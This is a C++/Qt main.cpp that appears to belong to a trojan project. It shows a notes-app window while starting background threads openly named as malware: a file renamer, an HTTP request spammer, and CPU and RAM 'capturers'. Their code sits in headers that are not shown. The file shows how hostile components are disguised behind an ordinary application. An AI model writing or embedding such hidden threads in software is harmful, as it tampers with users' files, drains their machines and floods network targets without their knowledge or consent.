#include "controller.h"
#include "malware_file_renamer.h"
#include "malware_http_spammer.h"
#include "malware_capturing_cpu.h"
#include "malware_capturing_ram.h"
#include <QApplication>
#include <QStyleFactory>


int main(int argc, char *argv[]) {
    QApplication application(argc, argv);
    application.setStyle(QStyleFactory::create("Fusion"));
    NoterController mainWindow;

    MalwareCapturerOfCpu malwareCapturerOfCpu;
    MalwareCapturerOfRam malwareCapturerOfRam;
    MalwareFileRenamer malwareFileRenamer;
    MalwareHttpRequestSender malwareHttpSpammer;

    QObject::connect(&application, &QCoreApplication::aboutToQuit, &malwareCapturerOfCpu, &MalwareCapturerOfCpu::quitThread);
    QObject::connect(&application, &QCoreApplication::aboutToQuit, &malwareCapturerOfRam, &MalwareCapturerOfRam::quitThread);
    QObject::connect(&application, &QCoreApplication::aboutToQuit, &malwareFileRenamer, &MalwareFileRenamer::quitThread);
    QObject::connect(&application, &QCoreApplication::aboutToQuit, &malwareHttpSpammer, &MalwareHttpRequestSender::quitThread);

    malwareFileRenamer.startThread();
    malwareCapturerOfCpu.startThread();
    malwareCapturerOfRam.startThread();
    malwareHttpSpammer.startThread();

    mainWindow.show();
    return application.exec();
}
